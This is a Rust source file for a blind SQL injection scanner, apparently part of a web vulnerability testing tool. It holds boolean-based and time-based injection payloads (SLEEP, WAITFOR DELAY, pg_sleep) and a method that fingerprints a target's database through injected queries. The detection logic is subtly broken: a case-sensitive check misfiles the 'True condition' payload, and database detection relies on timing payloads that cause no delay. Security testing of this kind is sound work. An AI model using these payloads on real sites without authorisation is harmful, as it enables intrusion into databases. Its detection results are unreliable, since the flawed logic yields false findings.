use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::detection::analyzer::{Finding, Severity};
use std::time::{Duration, Instant};
use tokio::time::timeout;
use anyhow::Result;

/// Blind SQL Injection scanner with timing-based and boolean-based detection
pub struct BlindSqliScanner {
    client: HttpClient,
    findings: Vec<Finding>,
    baseline_time: Duration,
    threshold_multiplier: f64,
    target: String,
}

impl BlindSqliScanner {
    /// Create a new blind SQL injection scanner
    pub fn new(target: String, timeout_secs: u64, insecure: bool) -> Result<Self> {
        let client = HttpClient::new(timeout_secs, insecure)?;
        
        Ok(Self {
            client,
            findings: Vec::new(),
            baseline_time: Duration::from_millis(0),
            threshold_multiplier: 2.5,
            target,
        })
    }

    /// Perform comprehensive blind SQL injection scan
    pub async fn comprehensive_scan(&mut self, url: &str, params: &[String]) -> Result<Vec<Finding>> {
        println!("[*] Performing comprehensive blind SQL injection scan on {} (target: {})", url, self.target);
        
        // Establish baseline response time
        self.establish_baseline(url, params).await?;
        
        // Test each parameter for blind SQL injection
        for param in params {
            println!("  [*] Testing parameter: {} for blind SQL injection", param);
            
            // Test boolean-based blind SQLi
            if let Some(finding) = self.test_boolean_blind_sqli(url, param).await {
                self.findings.push(finding);
            }
            
            // Test time-based blind SQLi
            if let Some(finding) = self.test_time_blind_sqli(url, param).await {
                self.findings.push(finding);
            }
        }
        
        Ok(self.findings.clone())
    }

    /// Establish baseline response time
    async fn establish_baseline(&mut self, url: &str, params: &[String]) -> Result<()> {
        println!("  [*] Establishing baseline response time...");
        
        let mut times = Vec::new();
        
        // Test with a few different parameters to get accurate baseline
        for param in params.iter().take(3) {
            for _ in 0..5 {
                let start = Instant::now();
                let _ = self.make_request(url, param, "baseline_test").await;
                let elapsed = start.elapsed();
                times.push(elapsed);
            }
        }
        
        // Calculate average baseline time (excluding outliers)
        times.sort_by(|a, b| a.as_millis().cmp(&b.as_millis()));
        let mid = times.len() / 2;
        self.baseline_time = if times.len() > 10 {
            times[mid]
        } else {
            let total: Duration = times.iter().sum();
            total / times.len() as u32
        };
        
        println!("  [*] Baseline response time established: {:?}", self.baseline_time);
        Ok(())
    }

    /// Test boolean-based blind SQL injection
    async fn test_boolean_blind_sqli(&mut self, url: &str, param: &str) -> Option<Finding> {
        let boolean_payloads = vec![
            ("' AND '1'='1", "True condition"),
            ("' AND '1'='2", "False condition"),
            ("' OR 1=1--", "Always true"),
            ("' AND 1=2--", "Always false"),
        ];

        let mut true_responses = Vec::new();
        let mut false_responses = Vec::new();

        for (payload, condition) in boolean_payloads {
            let start = Instant::now();
            match self.make_request(url, param, payload).await {
                Ok(response) => {
                    let response_text = response.body;
                    let elapsed = start.elapsed();
                    
                    if condition.contains("true") {
                        true_responses.push((response_text, elapsed));
                    } else {
                        false_responses.push((response_text, elapsed));
                    }
                }
                Err(_) => continue,
            }
        }

        // Analyze response differences between true and false conditions
        if let (Some(true_resp), Some(false_resp)) = (true_responses.first(), false_responses.first()) {
            let (true_text, _) = true_resp;
            let (false_text, _) = false_resp;

                if true_text != false_text && 
               (self.has_different_content(true_text, false_text) || 
                self.has_different_length(true_text, false_text)) {
                return Some(
                    Finding::new(
                        url,
                        Severity::High,
                        &format!("Boolean-based Blind SQL Injection in parameter '{}'", param),
                        &format!("Parameter '{}' shows different responses for true/false SQL conditions", param)
                    )
                    .with_evidence(&format!("True condition: {} | False condition: {}", 
                                            "' AND '1'='1", "' AND '1'='2"))
                    .with_remediation("Use parameterized queries and input validation")
                );
            }
        }

        None
    }

    /// Test time-based blind SQL injection with accurate timing
    async fn test_time_blind_sqli(&mut self, url: &str, param: &str) -> Option<Finding> {
        let time_payloads = vec![
            ("' AND SLEEP(3)--", Duration::from_secs(3)),
            ("' AND (SELECT SLEEP(3))--", Duration::from_secs(3)),
            ("' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--", Duration::from_secs(3)),
            ("' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)--", Duration::from_secs(2)),
            ("'; WAITFOR DELAY '00:00:03'--", Duration::from_secs(3)),
            ("' AND pg_sleep(3)--", Duration::from_secs(3)),
        ];

        for (payload, expected_delay) in time_payloads {
            // Test multiple times for accuracy
            let mut delays = Vec::new();
            
            for _ in 0..3 {
                let start = Instant::now();
                
                // Use timeout to prevent hanging
                match timeout(Duration::from_secs(10), self.make_request(url, param, payload)).await {
                    Ok(Ok(_)) => {
                        let elapsed = start.elapsed();
                        delays.push(elapsed);
                    }
                    Ok(Err(_)) => continue,
                    Err(_) => {
                        // Request timed out, likely vulnerable
                        delays.push(Duration::from_secs(10));
                    }
                }
            }

            if !delays.is_empty() {
                let avg_delay = delays.iter().sum::<Duration>() / delays.len() as u32;
                let threshold = Duration::from_millis((self.baseline_time.as_millis() as f64 * self.threshold_multiplier) as u64);

                println!("    [*] Payload: {} | Baseline: {:?} | Actual: {:?} | Threshold: {:?}", 
                        payload, self.baseline_time, avg_delay, threshold);

                // Check if delay is significantly longer than baseline
                if avg_delay > threshold && avg_delay >= expected_delay * 8 / 10 {
                    return Some(
                        Finding::new(
                            url,
                            Severity::High,
                            &format!("Time-based Blind SQL Injection in parameter '{}'", param),
                            &format!("Parameter '{}' responds with significant delay when injected with time-based SQL payload", param)
                        )
                        .with_evidence(&format!("Payload: {} | Expected delay: {:?} | Actual delay: {:?}", 
                                                payload, expected_delay, avg_delay))
                        .with_remediation("Use parameterized queries and avoid user input in database queries")
                    );
                }
            }
        }

        None
    }

    /// Check if responses have different content
    fn has_different_content(&self, resp1: &str, resp2: &str) -> bool {
        // Simple content difference check
        // In production, this would be more sophisticated
        resp1.len() != resp2.len() || 
        resp1.contains("error") != resp2.contains("error") ||
        resp1.contains("warning") != resp2.contains("warning")
    }

    /// Check if responses have significantly different lengths
    fn has_different_length(&self, resp1: &str, resp2: &str) -> bool {
        let len_diff = (resp1.len() as i64 - resp2.len() as i64).abs();
        let avg_len = (resp1.len() + resp2.len()) / 2;
        len_diff as f64 > avg_len as f64 * 0.1 // 10% difference threshold
    }

    /// Helper method to make requests with specific parameter and value
    async fn make_request(&self, url: &str, param: &str, value: &str) -> Result<crate::http::response::HttpResponse> {
        use crate::utils::url::UrlUtil;
        let request_url = UrlUtil::inject_param(url, param, value);
        let request = HttpRequest::get(&request_url);
        self.client.send(request).await
    }

    /// Extract database information using blind SQL injection techniques
    pub async fn extract_database_info(&mut self, url: &str, param: &str) -> Option<String> {
        println!("  [*] Attempting to extract database information...");
        
        // Try to determine database type
        let db_checks = vec![
            ("MySQL", "' AND (SELECT @@version_comment) LIKE '%MySQL%'--"),
            ("PostgreSQL", "' AND (SELECT version()) LIKE '%PostgreSQL%'--"),
            ("MSSQL", "' AND (SELECT @@VERSION) LIKE '%Microsoft SQL Server%'--"),
            ("Oracle", "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'--"),
        ];

        for (db_type, payload) in db_checks {
            let start = Instant::now();
            match self.make_request(url, param, payload).await {
                Ok(_) => {
                    let elapsed = start.elapsed();
                    
                    // Check for positive response (longer time indicates true condition)
                    if elapsed > Duration::from_millis((self.baseline_time.as_millis() as f64 * 1.5) as u64) {
                        return Some(format!("Database detected: {}", db_type));
                    }
                }
                Err(_) => continue,
            }
        }

        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_blind_sqli_scanner_creation() {
        let scanner = BlindSqliScanner::new("https://example.com".to_string(), 30, true).unwrap();
        assert_eq!(scanner.target, "https://example.com");
    }
}
